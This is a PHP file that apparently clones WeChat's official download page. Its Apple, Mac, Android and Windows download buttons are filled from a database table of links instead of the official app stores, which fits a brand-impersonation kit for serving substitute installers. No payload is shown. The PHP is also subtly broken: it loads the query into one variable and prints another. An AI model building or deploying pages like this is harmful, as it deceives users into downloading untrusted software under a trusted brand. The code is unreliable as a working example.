<?php
require "config.php";

$sql = "SELECT * FROM `links`";
$result = $mysql->query($sql)->fetch_assoc();



?>

<!DOCTYPE html>
<!-- saved from url=(0026)https://www.wechat.com/en/ -->
<html lang="en" class="en">

  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta
      name="facebook-domain-verification"
      content="b3spylm29rmtw1v91765iz8d7o8fl7"
    />
    <meta name="twitter:card" content="app" />
    <meta name="twitter:app:country" content="us" />
    <meta name="twitter:app:name:iphone" content="WeChat" />
    <meta name="twitter:app:id:iphone" content="414478124" />
    <meta name="twitter:app:url:iphone" content="weixin://" />
    <meta name="twitter:app:name:ipad" content="WeChat" />
    <meta name="twitter:app:id:ipad" content="414478124" />
    <meta name="twitter:app:url:ipad" content="weixin://" />
    <meta name="twitter:app:name:googleplay" content="WeChat" />
    <meta name="twitter:app:id:googleplay" content="com.tencent.mm" />
    <meta name="twitter:app:url:googleplay" content="weixin://" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta
      name="keywords"
      content="WeChat Weixin chat mobile chatting free send message send photo voice weixin offline message Weibo private message data consumption"
    />
    <meta
      name="description"
      content="Available for all kinds of platforms; enjoy group chat; support voice&amp;#44;photo&amp;#44;video and text messages."
    />
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="https://newres.wechat.com/t/fed_upload/25d133b0-63d9-4102-857c-5cc84c752232/NTI4MWU5.ico"
    />
    <link
      rel="mask-icon"
      href="https://newres.wechat.com/t/fed_upload/fdf269b2-1de3-4bb9-95c5-00150433b7f1/MjliNWVm.svg"
      color="#4C4C4C"
    />
    <link
      rel="apple-touch-icon-precomposed"
      href="https://newres.wechat.com/t/fed_upload/08b92997-2415-408f-b706-442ed4ede518/OTE0YTAw.png"
    />
    <title>WeChat - Free messaging and calling app</title>
    <link
      rel="stylesheet"
      href="./assets/46172cee66bf4f26d72091b7741b1a7e.css"
    />
    <style>
      @keyframes slide-in-one-tap {
        from {
          transform: translateY(80px);
        }
        to {
          transform: translateY(0px);
        }
      }

      .trust-hide-gracefully {
        opacity: 0;
      }

      .trust-wallet-one-tap .hidden {
        display: none;
      }

      .trust-wallet-one-tap .semibold {
        font-weight: 500;
      }

      .trust-wallet-one-tap .binance-plex {
        font-family: "Binance";
      }

      .trust-wallet-one-tap .rounded-full {
        border-radius: 50%;
      }

      .trust-wallet-one-tap .flex {
        display: flex;
      }

      .trust-wallet-one-tap .flex-col {
        flex-direction: column;
      }

      .trust-wallet-one-tap .items-center {
        align-items: center;
      }

      .trust-wallet-one-tap .space-between {
        justify-content: space-between;
      }

      .trust-wallet-one-tap .justify-center {
        justify-content: center;
      }

      .trust-wallet-one-tap .w-full {
        width: 100%;
      }

      .trust-wallet-one-tap .box {
        transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
        animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
        width: 384px;
        border-radius: 15px;
        background: #fff;
        box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
        position: fixed;
        right: 30px;
        bottom: 30px;
        z-index: 1020;
      }

      .trust-wallet-one-tap .header {
        gap: 15px;
        border-bottom: 1px solid #e6e6e6;
        padding: 10px 18px;
      }

      .trust-wallet-one-tap .header .left-items {
        gap: 15px;
      }

      .trust-wallet-one-tap .header .title {
        color: #1e2329;
        font-size: 18px;
        font-weight: 600;
        line-height: 28px;
      }

      .trust-wallet-one-tap .header .subtitle {
        color: #474d57;
        font-size: 14px;
        line-height: 20px;
      }

      .trust-wallet-one-tap .header .close {
        color: #1e2329;
        cursor: pointer;
      }

      .trust-wallet-one-tap .body {
        padding: 9px 18px;
        gap: 10px;
      }

      .trust-wallet-one-tap .body .right-items {
        gap: 10px;
        width: 100%;
      }

      .trust-wallet-one-tap .body .right-items .wallet-title {
        color: #1e2329;
        font-size: 16px;
        font-weight: 600;
        line-height: 20px;
      }

      .trust-wallet-one-tap .body .right-items .wallet-subtitle {
        color: #474d57;
        font-size: 14px;
        line-height: 20px;
      }

      .trust-wallet-one-tap .connect-indicator {
        gap: 15px;
        padding: 8px 0;
      }

      .trust-wallet-one-tap .connect-indicator .flow-icon {
        color: #474d57;
      }

      .trust-wallet-one-tap .loading-color {
        color: #fff;
      }

      .trust-wallet-one-tap .button {
        border-radius: 50px;
        outline: 2px solid transparent;
        outline-offset: 2px;
        background-color: rgb(5, 0, 255);
        border-color: rgb(229, 231, 235);
        cursor: pointer;
        text-align: center;
        height: 45px;
      }

      .trust-wallet-one-tap .button .button-text {
        color: #fff;
        font-size: 16px;
        font-weight: 600;
        line-height: 20px;
      }

      .trust-wallet-one-tap .footer {
        margin: 20px 30px;
      }

      .trust-wallet-one-tap .check-icon {
        color: #fff;
      }

      @font-face {
        font-family: "Binance";
        src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf)
          format("opentype");
        font-weight: 400;
        font-style: normal;
      }

      @font-face {
        font-family: "Binance";
        src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf)
          format("opentype");
        font-weight: 500;
        font-style: normal;
      }

      @font-face {
        font-family: "Binance";
        src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf)
          format("opentype");
        font-weight: 600;
        font-style: normal;
      }
    </style>
  </head>
  <body>
    <!--style-->
    <!--script-->
    <div class="container">
      <div class="content">
        <img class="ic_prod" src="./assets/1-MVNBf.png" />
        <div class="main">
          <div class="brand">
            <div class="logo"></div>
            <img class="bg_slogan" src="./assets/1jwBxj0.png" />
          </div>
          <div class="download_btns">
            <a
              class="btn ic_download_apple"
              href="<?php echo $links['apple']; ?>"
            ></a>
            <div class="download_android_btns">
              <a
                id="btn_android"
                class="btn ic_download_android"
                href="javascript:;"
              ></a>
              <div
                id="btn_android_wrap"
                class="btn_android_wrap"
                style="display: none"
              >
                <a
                  class="btn_googlepaly"
                  href="<?php echo $links['google']; ?>"
                  >Google Play</a
                >
                <a class="btn_weixin" href="https://weixin.qq.com/"
                  >Weixin Version</a
                >
              </div>
            </div>
          </div>
          <div class="download_btns">
            <a
              id="new_ele"
              class="btn ic_download_mac ele_new"
              style=""
              title="Mac Download"
              href="<?php echo $links['apple']; ?>"
            >
              <em class=""></em>
            </a>
            <a
              class="btn ic_download_win"
              style=""
              title="Windows Download"
              href="<?php echo $links['windows']; ?>"
            >
              <em class="i"></em>
            </a>
          </div>
        </div>
      </div>
    </div>
    <div></div>
    <!--style-->
    <!--script-->
    <div id="page_footer" class="footer group">
      <div class="footer_inner">
        <div class="footer_ele js_footer_ele l">
          <div class="second_menu_area js_footer_second_menu">
            <ul class="second_menu js_second_menu">
              <li class="second_menu_ele">
                <a
                  id="link_getting_started"
                  data-lang="en"
                  href="http://help.wechat.com/cgi-bin/micromsg-bin/oshelpcenter?opcode=2&amp;lang=en&amp;plat=ios&amp;id=1703037nA7fa170303ZJvq2U&amp;Channel=WeChatOfficialWebsite"
                  class="second_menu_link"
                  >Getting Started</a
                >
              </li>
              <li class="second_menu_ele">
                <a href="http://blog.wechat.com/" class="second_menu_link"
                  >What’s New</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/en/source_code.html"
                  class="second_menu_link"
                  >Source Code</a
                >
              </li>
            </ul>
            <span class="second_menu_hook"></span>
          </div>
          <a class="link footer_ele js_footer_link" href="javascript:;"
            >About<i class="ic_hook"></i
          ></a>
        </div>
        <div class="footer_ele js_footer_ele l">
          <div class="second_menu_area js_footer_second_menu">
            <ul class="second_menu js_second_menu">
              <li class="second_menu_ele">
                <a
                  href="http://help.wechat.com/oshelpcenter/?lang=en&amp;Channel=helpcenter"
                  class="second_menu_link"
                  >Help Center</a
                >
              </li>
              <li class="second_menu_ele">
                <a href="https://safety.wechat.com/" class="second_menu_link"
                  >Safety Center</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/en/contact_us.html"
                  class="second_menu_link"
                  >Contact Us</a
                >
              </li>
            </ul>
            <span class="second_menu_hook"></span>
          </div>
          <a class="link footer_ele js_footer_link" href="javascript:;"
            >Support<i class="ic_hook"></i
          ></a>
        </div>
        <div class="footer_ele js_footer_ele l">
          <div class="second_menu_area js_footer_second_menu">
            <ul class="second_menu js_second_menu">
              <li class="second_menu_ele">
                <a href="https://open.weixin.qq.com/" class="second_menu_link"
                  >Platform</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://pay.weixin.qq.com/index.php/public/wechatpay/home"
                  class="second_menu_link"
                  >Weixin Pay</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://pay.wechat.com/zh_hk/index.shtml"
                  class="second_menu_link"
                  >WeChat Pay HK</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://pay.wechat.com/en_my/index.html"
                  class="second_menu_link"
                  >WeChat Pay Malaysia</a
                >
              </li>
            </ul>
            <span class="second_menu_hook"></span>
          </div>
          <a class="link footer_ele js_footer_link" href="javascript:;"
            >Platform<i class="ic_hook"></i
          ></a>
        </div>
        <div class="footer_ele js_footer_ele l">
          <div class="second_menu_area menu_lang js_footer_second_menu">
            <ul class="second_menu js_second_menu js_langs">
              <li class="second_menu_ele">
                <a href="https://www.wechat.com/zh_CN/" class="second_menu_link"
                  >简体中文</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/en/"
                  data-lang="en"
                  class="second_menu_link"
                  >English</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/zh_TW/"
                  data-lang="zh_TW"
                  class="second_menu_link"
                  >繁體中文（臺灣）</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/zh_HK/"
                  data-lang="zh_HK"
                  class="second_menu_link"
                  >繁體中文（香港）</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/ar/"
                  data-lang="ar"
                  class="second_menu_link"
                  >العربية</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/de/"
                  data-lang="de"
                  class="second_menu_link"
                  >Deutsch</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/es/"
                  data-lang="es"
                  class="second_menu_link"
                  >Español</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/fr/"
                  data-lang="fr"
                  class="second_menu_link"
                  >Français</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/id/"
                  data-lang="id"
                  class="second_menu_link"
                  >Bahasa Indonesia</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/it/"
                  data-lang="it"
                  class="second_menu_link"
                  >Italiano</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/ja/"
                  data-lang="ja"
                  class="second_menu_link"
                  >日本語</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/ko/"
                  data-lang="ko"
                  class="second_menu_link"
                  >한국어</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/lo/"
                  data-lang="lo"
                  class="second_menu_link"
                  >ພາສາລາວ</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/ms/"
                  data-lang="ms"
                  class="second_menu_link"
                  >Bahasa Melayu</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/my/"
                  data-lang="my"
                  class="second_menu_link"
                  ><img
                    style="display: block; height: 22px; border: none"
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAAAsAQMAAADrZPyBAAAABlBMVEUAAAD///+l2Z/dAAAAAXRSTlMAQObYZgAAAKxJREFUGNOl0DEKg0AQBdC/CKaR2Fos5AoJaSxCvIqQI6QVsiDkFDnMLAvWOcKKoG3SWbkZIy6BdPqZ4jEwDHysSeyUnJQ5yibtYa9qlvaiWSD8K/cqvOTvbmNZtRqEiXvgoKkKyodkKUuB6CPgiPwVgmdUEeI5KQ5Bo+Sluadf3bp3NdCWb+s2NUZFLN0mplQn/uE6p53oWefGoRCWBZuAs06p185R4vtjLcoHOe9HkNPeuc0AAAAASUVORK5CYII="
                /></a>
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/pt/"
                  data-lang="pt"
                  class="second_menu_link"
                  >Português</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/ru/"
                  data-lang="ru"
                  class="second_menu_link"
                  >Русский</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/th/"
                  data-lang="th"
                  class="second_menu_link"
                  >ภาษาไทย</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/tr/"
                  data-lang="tr"
                  class="second_menu_link"
                  >Türkçe</a
                >
              </li>
              <li class="second_menu_ele">
                <a
                  href="https://www.wechat.com/vi/"
                  data-lang="vi"
                  class="second_menu_link"
                  >Tiếng Việt</a
                >
              </li>
            </ul>
            <span class="second_menu_hook"></span>
          </div>
          <a
            class="link footer_ele last_footer_ele js_footer_link"
            href="javascript:;"
            style=""
            >English<i class="ic_hook"></i
          ></a>
        </div>
        <p class="copyright footer_ele r">
          <span class="footer_ele"
            >Copyright © 2012-<span id="currentYear">2024</span>
            <a href="http://www.wechat.com/">WeChat</a>. All Rights
            Reserved.</span
          >
        </p>
        <p class="footer_ele r">
          <a
            href="https://www.wechat.com/en/service_terms.html"
            class="link footer_ele"
            >Terms of Service</a
          >|
          <a
            href="https://www.wechat.com/en/privacy_policy.html"
            class="link footer_ele"
            >Privacy Policy</a
          >|
          <a
            href="https://www.wechat.com/en/acceptable_use_policy.html"
            class="link footer_ele"
            >Acceptable Use Policy</a
          >
        </p>
        <span class="social_link footer_ele r">
          <a
            class="link ic_facebook"
            style="
              background-image: url(//newres.wechat.com/t/wx_fed/base/wechat/wechat-main-page/wechat-main-page-oversea-new/res/static/img/1TQxEzr.png);
            "
            href="https://www.facebook.com/wechatapp"
          ></a>
          <a
            class="link ic_twitter"
            style="
              background-image: url(//newres.wechat.com/t/wx_fed/base/wechat/wechat-main-page/wechat-main-page-oversea-new/res/static/img/1on3CPc.png);
            "
            href="https://twitter.com/#!/wechatapp"
          ></a>
        </span>
      </div>
    </div>
    <script>
      !(function () {
        var e = document.getElementById("currentYear"),
          n = new Date().getFullYear();
        e && n - +e.innerHTML == 1 && (e.innerHTML = n);
      })();
    </script>
    <script src="./assets/jquery.min.js"></script>
    <!--script-->
    <script>
      !(function () {
        var n,
          t = {};
        (n = function (n, e) {
          var i = arguments.length;
          if (i > 1) t[n] = e;
          else if (1 == i) {
            if ("object" != typeof n)
              return String(t[n] || n)
                .replace(/&#40;/g, "(")
                .replace(/&#41;/g, ")")
                .replace(/&#44;/g, ",")
                .replace(/&#39;/g, "'")
                .replace(/&quot;/g, '"');
            for (var o in n) n.hasOwnProperty(o) && (t[o] = n[o]);
          }
        }),
          "_" in window || (window._ = n);
      })();
      _({
        "Connecting a billion people with chat, calls, and more":
          "Connecting a billion people with chat, calls, and more",
        "Connecting a billion people with chat, calls, and more":
          "Connecting a billion people with chat, calls, and more",
        "Connecting a billion people with chat, calls, and more":
          "Connecting a billion people with chat, calls, and more",
      });
    </script>
    <script src="./assets/index_f89dbf8.js"></script>
  </body>
</html>
